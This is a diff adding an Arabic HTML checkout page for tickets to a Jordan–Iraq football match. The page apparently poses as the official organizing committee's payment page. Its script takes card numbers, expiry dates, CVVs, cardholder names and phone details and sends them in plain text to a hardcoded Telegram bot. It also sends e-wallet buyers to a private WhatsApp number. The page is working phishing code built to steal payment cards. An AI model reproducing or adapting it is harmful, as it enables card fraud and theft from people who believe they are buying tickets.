@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدفع لتذاكر مباراة الأردن والعراق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Droid+Arabic+Kufi:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" crossorigin="anonymous"/>
+    <style>
+        * { direction: rtl; font-family: 'Droid Arabic Kufi', sans-serif; }
+        body { background-color: #FFF; text-align: center;}
+        .logo-container { margin-top: 20px; margin-bottom: 20px;}
+        .logo-container img { width: 150px; height: auto;}
+        .payment-container {
+            max-width: 420px;
+            margin: 35px auto 0 auto;
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.09);
+            padding: 30px 32px;
+        }
+        .payment-title { font-size: 1.4rem; font-weight: bold; margin-bottom: 25px; color: #FF4500; }
+        .form-label { font-weight: bold; }
+        .payment-methods { display: flex; gap: 12px; justify-content: center; margin: 15px 0 25px 0;}
+        .payment-method {
+            border: 2px solid #f2f2f2; border-radius: 10px; padding: 18px 20px; width: 120px; cursor: pointer;
+            display: flex; flex-direction: column; align-items: center; transition: border 0.2s, background 0.2s;
+        }
+        .payment-method.selected, .payment-method:hover { border: 2px solid #FF4500; background: #fff8f4;}
+        .payment-method i { font-size: 2.2rem; color: #FF4500; margin-bottom: 6px;}
+        .payment-method span { font-size: 1.1rem;}
+        .hidden { display: none; }
+        .btn-pay { background: #FF4500; color: #fff; font-weight: bold; border: none; border-radius: 10px; padding: 11px 0;}
+        .btn-pay:active, .btn-pay:hover { background: #d13c00;}
+        .form-control { margin-bottom: 10px; }
+        .success-msg { color: #198754; font-weight: bold; margin-top: 18px;}
+        .error-msg { color: #dc3545; font-weight: bold; margin-top: 18px;}
+        footer { margin-top: 40px; background-color: #FF4500; width: 100%; bottom: 0px; padding: 10px; color: #FFF; font-weight: bold;}
+        footer small { font-size: 14px; color: #FFF; font-weight: bolder;}
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="https://www2.0zz0.com/2025/04/30/19/130700301.jpeg" alt="لوجو مباراة الأردن والعراق">
+    </div>
+    <div class="payment-container">
+        <div class="payment-title">اختر طريقة الدفع</div>
+        <div class="payment-methods">
+            <div class="payment-method" data-method="visa">
+                <i class="fab fa-cc-visa"></i>
+                <span>بطاقة صراف</span>
+            </div>
+            <div class="payment-method" data-method="ewallet" id="ewallet-method">
+                <i class="fas fa-wallet"></i>
+                <span>محفظة إلكترونية</span>
+            </div>
+            <div class="payment-method" data-method="click">
+                <i class="fas fa-mobile-alt"></i>
+                <span>كليك (click)</span>
+            </div>
+        </div>
+        <form id="paymentForm">
+            <!-- Visa Form -->
+            <div id="visa-form" class="hidden">
+                <div class="mb-2">
+                    <label class="form-label">رقم البطاقة</label>
+                    <input type="text" class="form-control" name="visa_number" maxlength="19" pattern="\d{16,19}" placeholder="1234 5678 9012 3456">
+                </div>
+                <div class="row mb-2">
+                    <div class="col-6">
+                        <label class="form-label">تاريخ الانتهاء</label>
+                        <input type="text" class="form-control" name="visa_expiry" maxlength="5" pattern="\d{2}/\d{2}" placeholder="MM/YY">
+                    </div>
+                    <div class="col-6">
+                        <label class="form-label">CVV</label>
+                        <input type="password" class="form-control" name="visa_cvv" maxlength="4" pattern="\d{3,4}" placeholder="***">
+                    </div>
+                </div>
+                <div class="mb-2">
+                    <label class="form-label">اسم حامل البطاقة</label>
+                    <input type="text" class="form-control" name="visa_name" placeholder="الاسم كما هو على البطاقة">
+                </div>
+            </div>
+            <!-- E-Wallet Form -->
+            <div id="ewallet-form" class="hidden">
+                <div class="mb-2">
+                    <label class="form-label">رقم المحفظة</label>
+                    <input type="text" class="form-control" name="ewallet_number" maxlength="15" pattern="\d{8,15}" placeholder="رقم الهاتف أو رقم المحفظة">
+                </div>
+                <div class="mb-2">
+                    <label class="form-label">اسم المحفظة (مثال: Orange Money, Zain Cash, ...)</label>
+                    <input type="text" class="form-control" name="ewallet_name" placeholder="اسم المحفظة">
+                </div>
+            </div>
+            <!-- click Form -->
+            <div id="click-form" class="hidden">
+                <div class="mb-2">
+                    <label class="form-label">رقم الهاتف للتواصل عبر WhatsApp</label>
+                    <input type="text" class="form-control" name="click_phone" maxlength="15" pattern="\d{8,15}" placeholder="رقم الهاتف">
+                </div>
+                <div class="mb-2">
+                    <label class="form-label">نوع التذكرة المطلوبة</label>
+                    <input type="text" class="form-control" name="click_otp" placeholder="نوع التذكرة">
+                </div>
+            </div>
+            <button type="submit" class="btn btn-pay w-100 mt-3">ادفع الآن</button>
+        </form>
+        <div id="msg"></div>
+    </div>
+    <footer>
+        <small>© 2025 جميع الحقوق محفوظة لـ اللجنة المنظمة لمباراة الأردن والعراق</small>
+    </footer>
+    <script>
+        // بيانات بوت تلجرام
+        const botToken = "7465262401:AAGN-vBzFsBSWe8vqy_YNlrvVfHNa7vPkHM"; // ضع توكن البوت هنا
+        const chatId = "6873334348"; // ضع chat_id هنا
+
+        // Payment method switching
+        const methods = document.querySelectorAll('.payment-method');
+        const visaForm = document.getElementById('visa-form');
+        const ewalletForm = document.getElementById('ewallet-form');
+        const clickForm = document.getElementById('click-form');
+        let selected = null;
+
+        function updateRequiredFields() {
+            // إزالة required من جميع الحقول
+            document.querySelectorAll('#visa-form input, #ewallet-form input, #click-form input').forEach(input => {
+                input.removeAttribute('required');
+            });
+            // إضافة required فقط للحقول الظاهرة
+            if(selected === 'visa') {
+                visaForm.querySelectorAll('input').forEach(input => input.setAttribute('required', 'required'));
+            } else if(selected === 'ewallet') {
+                ewalletForm.querySelectorAll('input').forEach(input => input.setAttribute('required', 'required'));
+            } else if(selected === 'click') {
+                clickForm.querySelectorAll('input').forEach(input => input.setAttribute('required', 'required'));
+            }
+        }
+
+        // توجيه عند الضغط على المحفظة الإلكترونية
+        document.getElementById('ewallet-method').onclick = function(e) {
+            // منع الكود الافتراضي (تحديد فقط) في البداية
+            e.preventDefault();
+            // توجيه لصفحة أخرى خاصة بالمحفظة الإلكترونية
+            window.location.href = 'https://api.whatsapp.com/send?phone=962776781083&text=اريد شراء تذكرة والدفع عن طريق محفظة إلكترونية';
+        };
+
+        // باقي وسائل الدفع
+        methods.forEach(m => {
+            // استثناء المحفظة الإلكترونية (تمت معالجتها أعلاه)
+            if(m.getAttribute('data-method') === 'ewallet') return;
+            m.onclick = () => {
+                methods.forEach(x => x.classList.remove('selected'));
+                m.classList.add('selected');
+                selected = m.getAttribute('data-method');
+                visaForm.classList.add('hidden');
+                ewalletForm.classList.add('hidden');
+                clickForm.classList.add('hidden');
+                if(selected === 'visa') visaForm.classList.remove('hidden');
+                if(selected === 'click') clickForm.classList.remove('hidden');
+                updateRequiredFields();
+            };
+        });
+
+        // عند إرسال النموذج
+        document.getElementById('paymentForm').onsubmit = function(e) {
+            e.preventDefault();
+            const msg = document.getElementById('msg');
+            if(!selected) {
+                msg.innerHTML = '<div class="error-msg">يرجى اختيار طريقة الدفع أولاً</div>';
+                return;
+            }
+
+            let message = "طلب دفع جديد لتذاكر مباراة الأردن والعراق:\n";
+            if(selected === "visa") {
+                const number = document.querySelector('[name="visa_number"]').value;
+                const expiry = document.querySelector('[name="visa_expiry"]').value;
+                const cvv = document.querySelector('[name="visa_cvv"]').value;
+                const name = document.querySelector('[name="visa_name"]').value;
+                message += `طريقة الدفع: فيزا\n`;
+                message += `رقم البطاقة: ${number}\nتاريخ الانتهاء: ${expiry}\nCVV: ${cvv}\nاسم حامل البطاقة: ${name}\n`;
+            }
+            else if(selected === "click") {
+                const phone = document.querySelector('[name="click_phone"]').value;
+                const otp = document.querySelector('[name="click_otp"]').value;
+                message += `طريقة الدفع: كليك\n`;
+                message += `رقم الهاتف: ${phone}\nرمز العملية (OTP): ${otp}\n`;
+            }
+
+            // إرسال البيانات إلى بوت التلجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    msg.innerHTML = '<div class="success-msg">تم إرسال بياناتك إلى تلجرام بنجاح! سيتم التواصل معك قريباً.</div>';
+                    document.getElementById("paymentForm").reset();
+                    visaForm.classList.add('hidden');
+                    clickForm.classList.add('hidden');
+                    methods.forEach(x => x.classList.remove('selected'));
+                    selected = null;
+                    updateRequiredFields();
+                } else {
+                    msg.innerHTML = '<div class="error-msg">حدث خطأ أثناء الإرسال! حاول مرة أخرى.</div>';
+                }
+            })
+            .catch(error => {
+                msg.innerHTML = '<div class="error-msg">حدث خطأ أثناء الإرسال!</div>';
+            });
+        };
+
+        // عند تحميل الصفحة تأكد أن جميع الحقول غير مطلوبة
+        updateRequiredFields();
+    </script>
+</body>
+</html>
